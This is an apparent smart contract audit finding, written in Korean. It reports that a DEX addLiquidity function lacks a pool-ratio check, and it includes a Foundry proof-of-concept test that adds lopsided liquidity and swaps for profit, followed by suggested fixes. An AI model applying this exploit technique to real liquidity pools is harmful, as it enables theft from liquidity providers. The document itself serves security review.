## medium - 토큰 유동성 풀의 AMM이 손상되어 비정상적인 가격 변동이 발생할 수 있습니다.

### 설명

./src/Dex.sol: 21-53

function addLiquidity(uint256 amountX, uint256 amountY, uint256 minLP) external returns (uint256 lpTokens)

```solidity
function addLiquidity(uint256 amountX, uint256 amountY, uint256 minLP) external returns (uint256 lpTokens) {
    require(amountX > 0 && amountY > 0, "Invalid amount");

    _updateReserves();

    uint256 allowanceX = tokenX.allowance(msg.sender, address(this));
    uint256 allowanceY = tokenY.allowance(msg.sender, address(this));
    require(allowanceX >= amountX, "ERC20: insufficient allowance");
    require(allowanceY >= amountY, "ERC20: insufficient allowance");

    uint256 balanceX = tokenX.balanceOf(msg.sender);
    uint256 balanceY = tokenY.balanceOf(msg.sender);
    require(balanceX >= amountX, "ERC20: transfer amount exceeds balance");
    require(balanceY >= amountY, "ERC20: transfer amount exceeds balance");

    tokenX.transferFrom(msg.sender, address(this), amountX);
    tokenY.transferFrom(msg.sender, address(this), amountY);

    if (totalSupply == 0) {
        lpTokens = Math.sqrt(amountX * amountY);
    } else {
        uint256 mintX = (amountX * totalSupply) / reserveX;
        uint256 mintY = (amountY * totalSupply) / reserveY;
        lpTokens = Math.min(mintX, mintY);
    }

    require(lpTokens >= minLP, "Minimum LP tokens not met");

    reserveX += amountX;
    reserveY += amountY;
    totalSupply += lpTokens;
    balanceOf[msg.sender] += lpTokens;
}
```

`addLiquidity` 함수에서 인자로 들어온 amountX, amountY의 값이 실제 유동성 풀의 토큰 비율과 일치하는지에 대한 검사가 존재하지 않습니다.

이에 따라 amountX, amountY만큼의 토큰이 모두 유동성 풀에 추가되어 유동성 풀 내의 토큰 공급량이 손상될 수 있습니다.

### 파급력

Medium - 유동성 공급 비율에 대한 검사가 이루어지지 않아, 공격자가 임의로 토큰 비율을 조정해 이익을 볼 수 있습니다.

```solidity
contract DexScript is Test {
    Dex public dex;
    IERC20 tokenX;
    IERC20 tokenY;

    function setUp() public {
        tokenX = new CustomERC20("X");
        tokenY = new CustomERC20("Y");
        dex = new Dex(address(tokenX), address(tokenY));
        tokenX.approve(address(dex), type(uint256).max);
        tokenY.approve(address(dex), type(uint256).max);

        dex.addLiquidity(800 ether, 700 ether, 0);
    }

    function test_exploit() public {
        
        uint LPReturn1 = dex.addLiquidity(8 ether, 7 ether, 0);
        console.log("LPReturn1: ", LPReturn1);

        uint swap1 = dex.swap(0, 100 ether, 0);
        console.log("swap1: ", swap1);

        
    }

    function test_exploit2() public {
        uint LPReturn2 = dex.addLiquidity(10000 ether, 1, 0);
        console.log("LPReturn2: ", LPReturn2);

        uint swap2 = dex.swap(0, 100 ether, 0);
        console.log("swap2: ", swap2);
    }
}
```

![image.png](https://prod-files-secure.s3.us-west-2.amazonaws.com/dcc66554-0f51-432b-b52f-51edb25200cb/ec12c0d9-35dc-4683-80e5-30f0cdb65145/image.png)

1. 특정 토큰의 유동성 비율을 매우 높거나 낮게 공급하여 토큰의 가격을 조정할 수 있습니다.
2. 조정된 비율로 swap 시에 공격자가 이익을 볼 수 있습니다.

### 해결 방안

1. addLiquidity 함수의 인자가 아닌 실제로 추가되어야할 토큰의 양을 현재 유동성 풀의 비율에 대해 계산하여 transfer하는 방법을 사용할 수 있습니다.
    1. amountX, amountY 중 실제로 유동성 풀에 추가될 수 있는 양(`aX`, `bX`을 계산)
    2. 아래와 같이, 계산된 토큰의 양을 transferFrom 합니다.
    `tokenX.transferFrom(msg.sender, address(this), aX);`
    `tokenY.transferFrom(msg.sender, address(this), aY);`
2. 유동성 풀의 토큰 양을 reserve 변수로 사용하고, skim 함수를 implement하여 필요한 경우 유동성 풀의 비율을 맞춰줄 수 있습니다.
    
    ```solidity
    function skim(address to) external lock {
            address _token0 = token0; // gas savings
            address _token1 = token1; // gas savings
            _safeTransfer(_token0, to, IERC20(_token0).balanceOf(address(this)).sub(reserve0));
            _safeTransfer(_token1, to, IERC20(_token1).balanceOf(address(this)).sub(reserve1));
        }
    ```
